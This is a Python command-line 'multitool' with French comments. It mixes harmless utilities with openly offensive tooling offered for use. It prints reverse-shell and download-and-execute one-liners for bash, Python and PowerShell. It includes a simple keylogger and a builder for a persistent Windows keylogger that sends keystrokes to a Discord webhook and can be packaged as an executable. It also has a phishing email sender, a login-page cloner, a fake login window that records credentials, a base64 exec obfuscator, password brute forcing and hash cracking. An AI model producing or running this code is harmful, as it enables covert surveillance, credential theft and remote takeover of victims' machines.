import argparse
import requests
import socket
import subprocess
import hashlib
import itertools
import sys
import os
from cryptography.fernet import Fernet
from pynput import keyboard
import tkinter as tk
from tkinter import simpledialog
import threading
import time
import base64
import urllib.parse
import qrcode
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from bs4 import BeautifulSoup
from faker import Faker
import nmap
import requests

# NMAP Vuln Scan
def nmap_vuln_scan(args):
    scanner = nmap.PortScanner()
    scanner.scan(args.target, arguments='-sV --script vuln')
    print(scanner.csv())

# Analyse headers HTTP
def http_headers_check(args):
    r = requests.get(args.url)
    headers = r.headers
    print("--- Analyse Headers ---")
    for k in ["Content-Security-Policy", "Strict-Transport-Security", "X-Frame-Options", "X-XSS-Protection", "X-Content-Type-Options"]:
        print(f"{k}: {headers.get(k, 'Absent')}")

# Subdomain takeover checker
def subdomain_scan(args):
    with open(args.wordlist) as f:
        for line in f:
            sub = f"http://{line.strip()}.{args.domain}"
            try:
                r = requests.get(sub, timeout=3)
                print(f"[+] {sub} -> {r.status_code}")
            except:
                print(f"[-] {sub} ne repond pas")

# Fake Identity Generator
fake = Faker()
def fake_identity(args):
    profile = fake.simple_profile()
    print("--- Identité Générée ---")
    for k, v in profile.items():
        print(f"{k}: {v}")

# Encode/Decode util
def encode_decode(args):
    text = args.text.encode()
    if args.mode == "b64":
        print(base64.b64encode(text).decode())
    elif args.mode == "hex":
        print(text.hex())
    elif args.mode == "rot13":
        print(text.decode().translate(str.maketrans('ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz',
                                                   'NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm')))
    elif args.mode == "url":
        print(urllib.parse.quote(args.text))

# QR Code generator
def qr_generator(args):
    img = qrcode.make(args.text)
    img.save(args.output)
    print(f"QR sauvegardé dans {args.output}")

# Email phishing simple
def email_phishing(args):
    msg = MIMEMultipart()
    msg['From'] = args.email
    msg['To'] = args.dest
    msg['Subject'] = args.subject

    msg.attach(MIMEText(args.body, 'html'))
    if args.attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(open(args.attachment, 'rb').read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{args.attachment}"')
        msg.attach(part)

    server = smtplib.SMTP(args.smtp, args.port)
    server.starttls()
    server.login(args.email, args.password)
    server.send_message(msg)
    server.quit()
    print("Email envoyé")

# Meta scraper
def meta_scraper(args):
    r = requests.get(args.url)
    soup = BeautifulSoup(r.text, 'html.parser')
    title = soup.title.string if soup.title else 'Pas de titre'
    desc = soup.find("meta", attrs={"name":"description"})
    og = soup.find("meta", property="og:image")
    print(f"Titre : {title}")
    print(f"Description : {desc['content'] if desc else 'Aucune'}")
    print(f"Image : {og['content'] if og else 'Aucune'}")

# Payload builder
def payload_builder(args):
    if args.type == 'bash':
        print(f"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1")
    elif args.type == 'python':
        print(f"python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{args.lhost}',{args.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['sh'])\"")
    elif args.type == 'powershell':
        print(f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://{args.lhost}:{args.lport}/payload.ps1')\"")

# Obfuscateur script
def obfuscate_script(args):
    with open(args.input, 'r') as f:
        content = f.read()
    encoded = base64.b64encode(content.encode()).decode()
    with open(args.output, 'w') as f:
        f.write(f"import base64;exec(base64.b64decode('{encoded}'))")
    print(f"Script obfusqué sauvegardé dans {args.output}")

# DLL Hijack placeholder

def dll_injector(args):
    print("Fonction placeholder: Simulation de détournement DLL à venir.")

# --------------------
# Collecte d'informations (OSINT)
# --------------------
def ip_info(args):
    """Recupere les metadonnees d'une IP via ipinfo.io"""
    url = f"https://ipinfo.io/{args.ip}/json"
    resp = requests.get(url)
    print(resp.json())


def user_search(args):
    plateformes = {
        'GitHub': f"https://github.com/{args.username}",
        'Reddit': f"https://www.reddit.com/user/{args.username}",
        'Twitter': f"https://twitter.com/{args.username}",
        'Instagram': f"https://www.instagram.com/{args.username}",
        'TikTok': f"https://www.tiktok.com/@{args.username}",
        'SoundCloud': f"https://soundcloud.com/{args.username}",
        'GitLab': f"https://gitlab.com/{args.username}",
        'Pinterest': f"https://www.pinterest.com/{args.username}",
        'Steam': f"https://steamcommunity.com/id/{args.username}",
        'Twitch': f"https://www.twitch.tv/{args.username}",
        'Vimeo': f"https://vimeo.com/{args.username}",
        'DeviantArt': f"https://www.deviantart.com/{args.username}",
        'Medium': f"https://medium.com/@{args.username}",
        'Flipboard': f"https://flipboard.com/@{args.username}",
        'Behance': f"https://www.behance.net/{args.username}",
        'Dribbble': f"https://dribbble.com/{args.username}",
        '500px': f"https://500px.com/{args.username}",
        'Flickr': f"https://www.flickr.com/people/{args.username}",
        'Replit': f"https://replit.com/@{args.username}",
        'CodePen': f"https://codepen.io/{args.username}",
        'Kaggle': f"https://www.kaggle.com/{args.username}",
        'LinkedIn': f"https://www.linkedin.com/in/{args.username}",
        'ProductHunt': f"https://www.producthunt.com/@{args.username}",
        'Keybase': f"https://keybase.io/{args.username}",
        'Spotify': f"https://open.spotify.com/user/{args.username}",
        'Strava': f"https://www.strava.com/athletes/{args.username}",
        'Letterboxd': f"https://letterboxd.com/{args.username}/"
    }

    for nom, url in plateformes.items():
        try:
            r = requests.head(url, allow_redirects=True, timeout=5)
            statut = 'Trouve' if r.status_code == 200 else 'Introuvable'
        except requests.RequestException:
            statut = 'Erreur'
        print(f"[{nom}] {statut} ({url})")


def whois_dns(args):
    """Execute whois et resolution DNS"""
    print("--- WHOIS ---")
    subprocess.call(["whois", args.domaine])
    print("--- DNS (dig ANY) ---")
    subprocess.call(["dig", args.domaine, "ANY"])

# --------------------
# Reseau & Captures
# --------------------
try:
    from scapy.all import sniff, ARP, Ether
except ImportError:
    sniff = ARP = Ether = None

def packet_sniffer(args):
    """Sniffer de paquets simple (scapy)"""
    if sniff is None:
        print("Scapy est requis pour le sniffer")
        return
    sniff(prn=lambda pkt: print(pkt.summary()), count=args.count)


def port_scan(args):
    """Scanner de ports TCP basique"""
    for port in range(args.debut, args.fin + 1):
        with socket.socket() as sock:
            sock.settimeout(0.5)
            try:
                sock.connect((args.hote, port))
                print(f"Port {port} : Ouvert")
            except:
                pass


def arp_detector(args):
    """Detecteur de spoofing ARP"""
    if sniff is None:
        print("Scapy est requis pour la detection ARP")
        return
    gateway_ip = args.gateway
    original_mac = None
    def monitor(pkt):
        nonlocal original_mac
        if pkt.haslayer(ARP) and pkt[ARP].psrc == gateway_ip:
            mac = pkt[ARP].hwsrc
            if original_mac is None:
                original_mac = mac
                print(f"MAC passerelle enregistre : {mac}")
            elif mac != original_mac:
                print(f"ALERTE ! MAC change de {original_mac} a {mac}")
    sniff(filter="arp", prn=monitor)


def ping_sweeper(args):
    """Balayage ICMP du reseau local"""
    net = args.reseau
    for i in range(1, 255):
        ip = f"{net}.{i}"
        if os.system(f"ping -n 1 -w 1000 {ip} > nul") == 0:
            print(f"{ip} est actif")

# --------------------
# Exploitation & Fuzzing
# --------------------
def http_fuzzer(args):
    """Fuzzer HTTP basique"""
    with open(args.wordlist) as f:
        for word in f:
            data = {args.champ: word.strip()}
            r = requests.post(args.url, data=data)
            if args.succes not in r.text:
                print(f"Possibilite avec {word.strip()}")


def brute_force(args):
    """Brute-force HTTP Basic Auth"""
    from requests.auth import HTTPBasicAuth
    with open(args.wordlist) as f:
        for pwd in f:
            r = requests.get(args.url, auth=HTTPBasicAuth(args.user, pwd.strip()))
            if r.status_code == 200:
                print(f"Succes! {args.user}:{pwd.strip()}")
                return
    print("Echec du brute force")


def reverse_shell(args):
    """Genere un one-liner reverse shell (bash)"""
    print(f"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1")


def keylogger_basic(args):
    """Keylogger simple enregistrant dans un fichier"""
    def on_press(key):
        try:
            k = key.char
        except AttributeError:
            k = key.name
        with open(args.outfile, 'a') as f:
            f.write(f"{k}\n")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# --------------------
# Crypto / Hash / Mots de passe
# --------------------
def crack_hash(args):
    """Crack un hash avec une wordlist"""
    htype = args.type.lower()
    with open(args.wordlist) as f:
        for word in f:
            if getattr(hashlib, htype)(word.strip().encode()).hexdigest() == args.hash:
                print(f"Cracke : {word.strip()}")
                return
    print("Hash introuvable")


def gen_wordlist(args):
    """Genere une wordlist personnalisee"""
    with open(args.output, 'w') as f:
        for combo in itertools.product(args.charset, repeat=args.length):
            f.write(''.join(combo) + '\n')
    print(f"Wordlist creee : {args.output}")


def encrypt_file(args):
    """Chiffre/dechiffre un fichier avec Fernet"""
    if args.gen_key:
        key = Fernet.generate_key()
        print(f"Cle : {key.decode()}")
        return
    f = Fernet(args.key.encode())
    data = open(args.file, 'rb').read()
    result = f.decrypt(data) if args.decrypt else f.encrypt(data)
    with open(args.output, 'wb') as o:
        o.write(result)
    print(f"Resultat sauvegarde : {args.output}")


def check_pwned(args):
    """Verifie une fuite de mot de passe via HaveIBeenPwned"""
    sha1 = hashlib.sha1(args.password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    r = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}")
    for line in r.text.splitlines():
        h, count = line.split(":")
        if h == suffix:
            print(f"Pwned! Occurrences : {count}")
            return
    print("Aucune fuite detectee")

# --------------------
# Ingenierie sociale
# --------------------
def clone_page(args):
    """Clone une page de login (HTML)"""
    r = requests.get(args.url)
    with open(args.output, 'w', encoding='utf-8') as f:
        f.write(r.text)
    print(f"Page clonee : {args.output}")


def shorten_link(args):
    """Raccourcit un lien via tinyurl.com"""
    r = requests.get(f"http://tinyurl.com/api-create.php?url={args.url}")
    print(f"Lien raccourci : {r.text}")


def fake_login(args):
    """Affiche une fausse fenetre de login et enregistre les infos"""
    root = tk.Tk()
    root.withdraw()
    user = simpledialog.askstring("Login", "Username:")
    pwd = simpledialog.askstring("Login", "Password:", show='*')
    with open(args.logfile, 'a') as f:
        f.write(f"{user}:{pwd}\n")
    print(f"Identifiants logs: {args.logfile}")

# --------------------
# Keylogger avance et builder
# --------------------
KEYLOG_TEMPLATE = '''import os
import sys
import threading
import time
import requests
from pynput import keyboard

WEBHOOK_URL = "{webhook}"
LOG_FILE = "{logfile}"
INTERVAL_LOG = 60
INTERVAL_SEND = 1800

buffer = []
lock = threading.Lock()

def on_press(key):
    try:
        k = key.char
    except:
        k = key.name
    if k == ' ':
        k = 'space'
    elif k == '\n':
        k = 'enter'
    with lock:
        buffer.append(k)


def write_logs():
    while True:
        time.sleep(INTERVAL_LOG)
        with lock:
            if buffer:
                with open(LOG_FILE, 'a') as f:
                    f.write(' '.join(buffer) + '\n')
                buffer.clear()


def send_logs():
    while True:
        time.sleep(INTERVAL_SEND)
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as f:
                data = f.read()
            requests.post(WEBHOOK_URL, json={'content': f"```{data}```"})


def main():
    # Auto-start Windows
    try:
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        src = os.path.abspath(sys.argv[0])
        dst = os.path.join(startup, os.path.basename(src))
        if not os.path.exists(dst):
            import shutil; shutil.copy(src, dst)
    except:
        pass

    threading.Thread(target=write_logs, daemon=True).start()
    threading.Thread(target=send_logs, daemon=True).start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
'''

def build_keylogger(args):
    """Genere un script keylogger standalone (.py ou .exe)"""
    content = KEYLOG_TEMPLATE.format(webhook=args.webhook, logfile=args.output)
    py_file = args.output + ('.py' if args.type == 'py' else '.py')
    with open(py_file, 'w') as f:
        f.write(content)
    print(f"Script Python genere: {py_file}")
    if args.type == 'exe':
        subprocess.call([sys.executable, '-m', 'pip', 'install', 'pyinstaller'])
        subprocess.call(['pyinstaller', '--onefile', py_file])
        print("Executable genere dans dist\\")

# --------------------
# CLI principal
# --------------------
def main():
    parser = argparse.ArgumentParser(description="Outil multifonction CyberSec CLI")
    sub = parser.add_subparsers(dest='command')

    # OSINT
    p = sub.add_parser('ip-info', help='Infos sur une IP')
    p.add_argument('ip', help='Adresse IP a analyser')
    p.set_defaults(func=ip_info)

    p = sub.add_parser('user-search', help='Recherche d utilisateur')
    p.add_argument('username', help='Nom d utilisateur a verifier')
    p.set_defaults(func=user_search)

    p = sub.add_parser('whois', help='Whois et DNS')
    p.add_argument('domaine', help='Nom de domaine a interroger')
    p.set_defaults(func=whois_dns)

    # Reseau
    p = sub.add_parser('sniff', help='Sniffer de paquets')
    p.add_argument('--count', type=int, default=0, help='Nombre de paquets a capturer')
    p.set_defaults(func=packet_sniffer)

    p = sub.add_parser('port-scan', help='Scanner de ports TCP')
    p.add_argument('hote', help='Hote ou IP cible')
    p.add_argument('--debut', type=int, default=1, help='Port de debut')
    p.add_argument('--fin', type=int, default=1024, help='Port de fin')
    p.set_defaults(func=port_scan)

    p = sub.add_parser('arp-detector', help='Detecteur de spoofing ARP')
    p.add_argument('gateway', help='IP de la passerelle')
    p.set_defaults(func=arp_detector)

    p = sub.add_parser('ping-sweep', help='Balayage ICMP')
    p.add_argument('reseau', help='Base du reseau, ex: 192.168.1')
    p.set_defaults(func=ping_sweeper)

    # Exploitation
    p = sub.add_parser('http-fuzz', help='Fuzzer HTTP')
    p.add_argument('url', help='URL cible')
    p.add_argument('champ', help='Nom du champ a fuzzifier')
    p.add_argument('wordlist', help='Chemin de la wordlist')
    p.add_argument('--succes', default='Invalid', help='Texte indiquant un echec')
    p.set_defaults(func=http_fuzzer)

    p = sub.add_parser('brute-auth', help='Brute-force HTTP Basic')
    p.add_argument('url', help='URL protegee')
    p.add_argument('user', help='Nom d utilisateur')
    p.add_argument('wordlist', help='Chemin de la wordlist')
    p.set_defaults(func=brute_force)

    p = sub.add_parser('reverse-shell', help='One-liner reverse shell')
    p.add_argument('lhost', help='Adresse locale')
    p.add_argument('lport', help='Port local')
    p.set_defaults(func=reverse_shell)

    p = sub.add_parser('keylogger-basic', help='Demarre keylogger basique')
    p.add_argument('outfile', help='Fichier de sortie')
    p.set_defaults(func=keylogger_basic)

    # Crypto
    p = sub.add_parser('crack-hash', help='Crack un hash')
    p.add_argument('type', help='Type de hash (md5, sha1...)')
    p.add_argument('hash', help='Valeur du hash')
    p.add_argument('wordlist', help='Chemin de la wordlist')
    p.set_defaults(func=crack_hash)

    p = sub.add_parser('gen-wordlist', help='Genere une wordlist')
    p.add_argument('charset', help='Jeu de caracteres')
    p.add_argument('length', type=int, help='Longueur des mots')
    p.add_argument('output', help='Fichier de sortie')
    p.set_defaults(func=gen_wordlist)

    p = sub.add_parser('crypt', help='Chiffre/dechiffre fichier')
    p.add_argument('--gen-key', action='store_true', help='Genere une cle')
    p.add_argument('--decrypt', action='store_true', help='Dechiffre au lieu de chiffrer')
    p.add_argument('--key', help='Cle Fernet')
    p.add_argument('file', help='Fichier entree')
    p.add_argument('output', help='Fichier sortie')
    p.set_defaults(func=encrypt_file)

    p = sub.add_parser('pwned', help='Verifie mot de passe pwned')
    p.add_argument('password', help='Mot de passe a verifier')
    p.set_defaults(func=check_pwned)

    # Ingenierie sociale
    p = sub.add_parser('clone-page', help='Clone page HTML')
    p.add_argument('url', help='URL a cloner')
    p.add_argument('output', help='Fichier sortie')
    p.set_defaults(func=clone_page)

    p = sub.add_parser('shorten', help='Raccourcir lien')
    p.add_argument('url', help='URL a raccourcir')
    p.set_defaults(func=shorten_link)

    p = sub.add_parser('fake-login', help='Fausse fenetre login')
    p.add_argument('logfile', help='Fichier log')
    p.set_defaults(func=fake_login)

    # Builder keylogger persistant
    p = sub.add_parser('build-keylogger', help='Construire keylogger persistant')
    p.add_argument('type', choices=['py', 'exe'], help='Type genere')
    p.add_argument('webhook', help='Webhook Discord')
    p.add_argument('output', help='Nom fichier sortie')
    p.set_defaults(func=build_keylogger)

    args = parser.parse_args()
    if hasattr(args, 'func') and args.command:
        args.func(args)
    else:
        parser.print_help()

def menu():
    os.system('cls')
    print("""
  ██ ▄█▀ ██▀███  ▓█████▄  ██ ▄█▀▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████ 
 ██▄█▒ ▓██ ▒ ██▒▒██▀ ██▌ ██▄█▒ ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒ 
▓███▄░ ▓██ ░▄█ ▒░██   █▌▓███▄░ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄   
▓██ █▄ ▒██▀▀█▄  ░▓█▄   ▌▓██ █▄ ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒
▒██▒ █▄░██▓ ▒██▒░▒████▓ ▒██▒ █▄  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒
▒ ▒▒ ▓▒░ ▒▓ ░▒▓░ ▒▒▓  ▒ ▒ ▒▒ ▓▒  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
░ ░▒ ▒░  ░▒ ░ ▒░ ░ ▒  ▒ ░ ░▒ ▒░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░
░ ░░ ░   ░░   ░  ░ ░  ░ ░ ░░ ░   ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░  
░  ░      ░        ░    ░  ░                ░ ░      ░ ░      ░  ░      ░  
                 ░                                                          
""")

    while True:
        print("\n=== MENU CYBERSEC MULTITOOL ===")
        print("[1] Infos sur une IP")
        print("[2] Recherche d'utilisateur")
        print("[3] Whois et DNS")
        print("[4] Scanner de ports")
        print("[5] Ping sweep")
        print("[6] Sniffer de paquets")
        print("[7] Detecteur ARP")
        print("[8] Fuzzer HTTP")
        print("[9] Brute-force HTTP Basic")
        print("[10] Reverse shell one-liner")
        print("[11] Keylogger basique")
        print("[12] Crack hash")
        print("[13] Generer une wordlist")
        print("[14] Chiffrement/dechiffrement")
        print("[15] Mot de passe Pwned")
        print("[16] Cloner une page HTML")
        print("[17] Raccourcir un lien")
        print("[18] Fausse fenetre de login")
        print("[19] Builder keylogger avancé")
        print("[20] Scan vulnérabilités Nmap")
        print("[21] Analyse headers HTTP")
        print("[22] Scan takeover de sous-domaines")
        print("[23] Générer une fausse identité")
        print("[24] Encodeur/Décodeur")
        print("[25] Générateur de QR Code")
        print("[26] Envoi d'e-mail phishing")
        print("[27] Scraper de meta d'une page")
        print("[28] Générateur de payloads")
        print("[29] Obfuscateur de script")
        print("[30] Détournement DLL (placeholder)")
        print("[0] Quitter")

        try:
            choix = int(input("\nChoisis une option : "))
            if choix == 0:
                break

            elif choix == 1:
                ip = input("Adresse IP : ")
                ip_info(argparse.Namespace(ip=ip))

            elif choix == 2:
                username = input("Nom d'utilisateur : ")
                user_search(argparse.Namespace(username=username))

            elif choix == 3:
                domaine = input("Nom de domaine : ")
                whois_dns(argparse.Namespace(domaine=domaine))

            elif choix == 4:
                hote = input("IP/Hote cible : ")
                debut = int(input("Port de debut : "))
                fin = int(input("Port de fin : "))
                port_scan(argparse.Namespace(hote=hote, debut=debut, fin=fin))

            elif choix == 5:
                reseau = input("Reseau de base (ex: 192.168.1) : ")
                ping_sweeper(argparse.Namespace(reseau=reseau))

            elif choix == 6:
                count = int(input("Nombre de paquets a capturer (0 = illimite) : "))
                packet_sniffer(argparse.Namespace(count=count))

            elif choix == 7:
                gateway = input("Adresse IP de la passerelle : ")
                arp_detector(argparse.Namespace(gateway=gateway))

            elif choix == 8:
                url = input("URL cible : ")
                champ = input("Champ a fuzzifier : ")
                wordlist = input("Chemin vers la wordlist : ")
                succes = input("Texte indiquant un echec (par defaut: Invalid) : ") or "Invalid"
                http_fuzzer(argparse.Namespace(url=url, champ=champ, wordlist=wordlist, succes=succes))

            elif choix == 9:
                url = input("URL protegee : ")
                user = input("Nom d'utilisateur : ")
                wordlist = input("Chemin vers la wordlist : ")
                brute_force(argparse.Namespace(url=url, user=user, wordlist=wordlist))

            elif choix == 10:
                lhost = input("Adresse locale (LHOST) : ")
                lport = input("Port local (LPORT) : ")
                reverse_shell(argparse.Namespace(lhost=lhost, lport=lport))

            elif choix == 11:
                outfile = input("Nom du fichier log : ")
                keylogger_basic(argparse.Namespace(outfile=outfile))

            elif choix == 12:
                htype = input("Type de hash (md5, sha1...) : ")
                hval = input("Valeur du hash : ")
                wordlist = input("Chemin vers la wordlist : ")
                crack_hash(argparse.Namespace(type=htype, hash=hval, wordlist=wordlist))

            elif choix == 13:
                charset = input("Jeu de caracteres (ex: abc123) : ")
                length = int(input("Longueur des mots : "))
                output = input("Nom du fichier wordlist : ")
                gen_wordlist(argparse.Namespace(charset=charset, length=length, output=output))

            elif choix == 14:
                mode = input("Mode [encrypt/decrypt/gen-key] : ")
                if mode == "gen-key":
                    encrypt_file(argparse.Namespace(gen_key=True, decrypt=False, key=None, file=None, output=None))
                else:
                    key = input("Cle Fernet : ")
                    file = input("Fichier d'entree : ")
                    output = input("Fichier de sortie : ")
                    decrypt = (mode == "decrypt")
                    encrypt_file(argparse.Namespace(gen_key=False, decrypt=decrypt, key=key, file=file, output=output))

            elif choix == 15:
                password = input("Mot de passe a verifier : ")
                check_pwned(argparse.Namespace(password=password))

            elif choix == 16:
                url = input("URL a cloner : ")
                if not url.startswith("http"):
                    url = "http://" + url
                output = input("Nom du fichier HTML : ")
                clone_page(argparse.Namespace(url=url, output=output))

            elif choix == 17:
                url = input("Lien a raccourcir : ")
                shorten_link(argparse.Namespace(url=url))

            elif choix == 18:
                logfile = input("Fichier de log : ")
                fake_login(argparse.Namespace(logfile=logfile))

            elif choix == 19:
                typ = input("Type de fichier [py/exe] : ")
                webhook = input("URL du webhook Discord : ")
                output = input("Nom du fichier de sortie : ")
                build_keylogger(argparse.Namespace(type=typ, webhook=webhook, output=output))

            elif choix == 20:
                target = input("Cible IP ou domaine : ")
                nmap_vuln_scan(argparse.Namespace(target=target))

            elif choix == 21:
                url = input("URL à analyser : ")
                http_headers_check(argparse.Namespace(url=url))

            elif choix == 22:
                domain = input("Nom de domaine : ")
                wordlist = input("Chemin de la wordlist de sous-domaines : ")
                subdomain_scan(argparse.Namespace(domain=domain, wordlist=wordlist))

            elif choix == 23:
                fake_identity(argparse.Namespace())

            elif choix == 24:
                text = input("Texte à encoder/décoder : ")
                mode = input("Mode [b64/hex/rot13/url] : ")
                encode_decode(argparse.Namespace(text=text, mode=mode))

            elif choix == 25:
                text = input("Texte ou URL à convertir en QR : ")
                output = input("Nom du fichier PNG : ")
                qr_generator(argparse.Namespace(text=text, output=output))

            elif choix == 26:
                smtp = input("Serveur SMTP : ")
                port = int(input("Port : "))
                email = input("Adresse email source : ")
                password = input("Mot de passe : ")
                dest = input("Destinataire : ")
                subject = input("Sujet : ")
                body = input("Corps HTML : ")
                attachment = input("Pièce jointe (laisser vide si aucune) : ") or None
                email_phishing(argparse.Namespace(smtp=smtp, port=port, email=email, password=password, dest=dest, subject=subject, body=body, attachment=attachment))

            elif choix == 27:
                url = input("URL de la page : ")
                meta_scraper(argparse.Namespace(url=url))

            elif choix == 28:
                typ = input("Type de payload [bash/python/powershell] : ")
                lhost = input("LHOST : ")
                lport = input("LPORT : ")
                payload_builder(argparse.Namespace(type=typ, lhost=lhost, lport=lport))

            elif choix == 29:
                input_file = input("Fichier source : ")
                output_file = input("Fichier de sortie obfusqué : ")
                obfuscate_script(argparse.Namespace(input=input_file, output=output_file))

            elif choix == 30:
                dll_injector(argparse.Namespace())

            else:
                print("Option invalide.")

        except ValueError:
            print("Entree non valide.")


if __name__ == '__main__':
    menu()
